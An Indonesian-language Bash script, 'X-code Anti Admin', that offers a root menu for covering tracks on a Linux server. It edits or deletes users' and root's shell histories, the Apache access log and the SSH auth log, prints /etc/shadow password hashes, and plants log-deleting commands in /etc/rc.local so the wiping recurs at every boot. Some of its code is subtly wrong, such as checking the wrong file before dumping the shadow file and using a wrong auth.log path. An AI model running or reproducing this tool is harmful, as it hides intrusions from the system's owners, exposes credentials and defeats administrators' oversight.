#!/bin/bash
again='y'
while [ $again == 'Y' ] || [ $again == 'y' ];
do
clear
echo "================================================";
echo "       X-code Anti Admin (Root access only)     ";
echo "                 Version v0.1                   ";
echo "                Oleh Kurniawan                  ";
echo "         kurniawan@securityhub.id               ";
echo "                 xcode.or.id                    ";
echo "------------------------------------------------";
echo "1.  Cek keberadaan log user                     ";
echo "2.  Edit isi log user           		      ";
echo "3.  Ubah kepemilikan user ke user.user          ";
echo "4.  Kosongkan log user (user.user)              ";
echo "------------------------------------------------";
echo "5.  Cek keberadaan log akses root               ";
echo "6.  Edit isi log akses root                     ";
echo "7.  Ubah kepemilikan menjadi root.root          ";
echo "8.  Hapus log akses root (root.root)            ";
echo "------------------------------------------------";
echo "9.  Cek keberadaan log akses apache2            ";
echo "10. Edit isi log akses apache2                  ";
echo "11. Ubah kepemilikan menjadi root.adm           ";
echo "12. Hapus log akses apache2 (root.adm)          ";
echo "------------------------------------------------";
echo "13. Cek keberadaan log akses SSH                ";
echo "14. Edit isi log SSH                            ";
echo "15. Ubah kepemilikan menjadi syslog.adm         ";
echo "16. Hapus log SSH (syslog.adm)                  ";
echo "------------------------------------------------";
echo "17. Lihat user linux                            ";
echo "18. Lihat isi group linux                       ";
echo "19. Lihat password user linux (encrypt)         ";
echo "------------------------------------------------";
echo "20. Pasang penghapus log di rc.local            ";
echo "21. Edit rc.local                               ";
echo "22. Exit                                        ";
echo "================================================";

read -p "Masukkan Pilihan Anda antara 1 hingga 22: " choice;
echo "";
case $choice in
1)  echo -n "Masukkan nama user: "
    read namauser
    if [ -z "$(sudo ls -la /home/$namauser/.bash_history)" ]; then
    echo "Tidak terdeteksi ada file .bash_history di folder /home/$namauser/"
    else
    echo "Terdeteksi ada file .bash_history di folder /home/$namauser/"
    sudo ls -la /home/$namauser/.bash_history
    fi
    ;;
2)  echo -n "Masukkan nama user: "
    read namauser
    if [ -z "$(sudo ls -la /home/$namauser/.bash_history)" ]; then
    echo "Tidak terdeteksi ada file .bash_history di folder /home/$namauser/"
    else
    echo "File .bash_history di folder /home/$namauser/ dihapus"
    sudo nano /home/$namauser/.bash_history
    fi
    ;;
3)  echo -n "Masukkan nama user: "
    read namauser
    if [ -z "$(sudo ls -la /home/$namauser/.bash_history)" ]; then
    echo "Tidak terdeteksi ada file .bash_history di folder /home/$namauser/"
    else
    echo "File .bash_history di folder /home/$namauser/ diubah menjadi $namauser.$namauser"
    sudo chown $namauser.$namauser /home/$namauser/.bash_history
    fi
    ;;
4)  echo -n "Masukkan nama user: "
    read namauser
    if [ -z "$(sudo ls -la /home/$namauser/.bash_history)" ]; then
    echo "Tidak terdeteksi ada file .bash_history di folder /home/$namauser/"
    else
    echo "File .bash_history di folder /home/$namauser/ dihapus"
    echo "Log baru akan tampil setelah linux direstart"
    sudo rm /home/$namauser/.bash_history
    sudo touch /home/$namauser/.bash_history
    sudo chown $namauser.$namauser /home/$namauser/.bash_history
    fi
    ;;
5)  if [ -z "$(sudo ls -la /root/.bash_history)" ]; then
    echo "Tidak terdeteksi ada file .bash_history di root"
    else
    echo "Terdeteksi ada file .bash_history di folder /root/"
    sudo ls -la /root/.bash_history
    fi
    ;;   
6)  if [ -z "$(sudo ls -la /root/.bash_history)" ]; then
    echo "Tidak terdeteksi ada file .bash_history di root"
    else
    echo "File .bash_history di folder /root/ dibuka"
    sudo nano /root/.bash_history
    fi
    ;;
7)  if [ -z "$(sudo ls -la /root/.bash_history)" ]; then
    echo "Tidak terdeteksi ada file .bash_history di root"
    else
    echo "File .bash_history di folder /root/ hak aksesnya diubah menjadi root.root"
    sudo chown root.root /root/.bash_history
    fi
    ;;

8)  if [ -z "$(sudo ls -la /root/.bash_history)" ]; then
    echo "Tidak terdeteksi ada file .bash_history di root"
    else
    echo "File .bash_history di folder /root/ dihapus"
    echo "Log baru akan tampil setelah linux direstart"
    sudo rm /root/.bash_history
    sudo touch /root/.bash_history
    sudo chown root.root /root/.bash_history
    fi
    ;;   

9)  if [ -z "$(sudo ls -A /var/log/apache2/access.log)" ]; then
    echo "Tidak terdeteksi ada file access.log* di folder /var/log/apache2/"
    else
    echo "Terdeteksi ada file access.log di folder /var/log/apache2/"
    sudo ls -l /var/log/apache2/access.log
    fi
    ;;
10)  if [ -z "$(sudo ls -A /var/log/apache2/access.log)" ]; then
    echo "Tidak terdeteksi ada file access.log* di folder /var/log/apache2/"
    else
    echo "File access.log di folder /var/log/apache2/ dibuka"
    sudo nano /var/log/apache2/access.log
    fi
    ;;
11) if [ -z "$(sudo ls -A /var/log/apache2/access.log)" ]; then
    echo "Tidak terdeteksi ada file access.log* di folder /var/log/apache2/"
    else
    echo "File access.log di folder /var/log/apache2/ hak aksesnya diubah menjadi root.adm"
    sudo chown root.adm /var/log/apache2/access.log
    fi
    ;;

12) if [ -z "$(sudo ls -A /var/log/apache2/access.log)" ]; then
    echo "Tidak terdeteksi ada file access.log di folder /var/log/apache2/"
    else
    echo "File access.log di folder /var/log/apache2/ dihapus"
    echo "Log baru akan tampil setelah linux direstart"
    sudo rm /var/log/apache2/access.log*
    sudo touch /var/log/apache2/access.log
    sudo chown root.adm /var/log/apache2/access.log
    fi
    ;;
13) if [ -z "$(sudo ls -A /var/log/auth.log)" ]; then
    echo "Tidak terdeteksi ada file auth.log di folder /var/log/"
    else
    echo "Terdeteksi ada file auth.log di folder /var/log/"
    sudo ls -l /var/log/auth.log
    fi
    ;;
14) if [ -z "$(sudo ls -A /var/log/auth.log)" ]; then
    echo "Tidak terdeteksi ada file auth.log* di folder /var/log/"
    else
    echo "File auth.log di folder /var/log/ dibuka"
    sudo nano /var/log/auth.log
    fi
    ;;
15) if [ -z "$(sudo ls -A /var/log/auth.log)" ]; then
    echo "Tidak terdeteksi ada file auth.log di folder /var/log/"
    else
    echo "File auth.log di folder /var/log/ hak aksesnya diubah menjadi root.adm"
    sudo chown syslog.adm /var/log/auth.log
    fi
    ;;

16) if [ -z "$(sudo ls -A /var/log/auth.log)" ]; then
    echo "Tidak terdeteksi ada file auth.log di folder /var/log/"
    else
    echo "File auth.log di folder /var/log/"
    echo "Log baru akan tampil setelah linux direstart"
    sudo rm /var/log/auth.log*
    sudo touch /var/log/auth.log
    sudo chown syslog.adm /var/log/auth.log
    fi
    ;;
17) if [ -z "$(sudo ls -A /etc/passwd)" ]; then
    echo "Tidak terdeteksi file /etc/passwd di linux"
    else
    echo "File /etc/passwd dibuka"
    sudo cat /etc/passwd
    fi
    ;;
18) if [ -z "$(sudo ls -A /etc/group)" ]; then
    echo "Tidak terdeteksi file /etc/group di linux"
    else
    echo "File /etc/group dibuka"
    sudo cat /etc/group
    fi
    ;;
19) if [ -z "$(sudo ls -A /etc/group)" ]; then
    echo "Tidak terdeteksi file /etc/shadow di linux"
    else
    echo "File /etc/shadow dibuka"
    sudo cat /etc/shadow
    fi
    ;;
20)  if [ -z "$(sudo ls -A /etc/rc.local)" ]; then
    echo "Tidak terdeteksi ada file rc.local di /etc/"
    else
    echo "File rc.local di folder /etc/ disisipkan penghapus log"
    sudo sed -i -e '$i \rm /root/.bash_history\n' /etc/rc.local
    sudo sed -i -e '$i \rm /var/log/apache2/access.log*\n' /etc/rc.local
    sudo sed -i -e '$i \rm /root/log/auth.log*\n' /etc/rc.local
    sudo sed -i -e '$i \touch /root/.bash_history\n' /etc/rc.local
    sudo sed -i -e '$i \touch /var/log/apache2/access.log\n' /etc/rc.local
    sudo sed -i -e '$i \touch /root/log/auth.log\n' /etc/rc.local
    sudo sed -i -e '$i \chown root.root /root/.bash_history\n' /etc/rc.local
    sudo sed -i -e '$i \chown root.adm /var/log/apache2/access.log\n' /etc/rc.local
    sudo sed -i -e '$i \chown syslog.adm /root/log/auth.log\n' /etc/rc.local
    fi
    ;; 

21) if [ -z "$(sudo ls -A /etc/rc.local)" ]; then
    echo "Tidak terdeteksi ada file rc.local di /etc/"
    else
    echo "File rc.local di folder /etc/ dibuka"
    nano /etc/rc.local
    fi
    ;; 

22)    exit
    ;;
*)    echo "Maaf, menu tidak ada"
esac
echo ""
echo "X-code Anti Admin (Root access only)"
echo "Oleh Kurniawan. xcode.or.id. E-mail : kurniawan@securityhub.id"
echo ""
echo -n "Kembali ke menu? [y/n]: ";
read again;
while [ $again != 'Y' ] && [ $again != 'y' ] && [ $again != 'N' ] && [ $again != 'n' ];
do
echo "Masukkan yang anda pilih tidak ada di menu";
echo -n "Kembali ke menu? [y/n]: ";
read again;
done
done
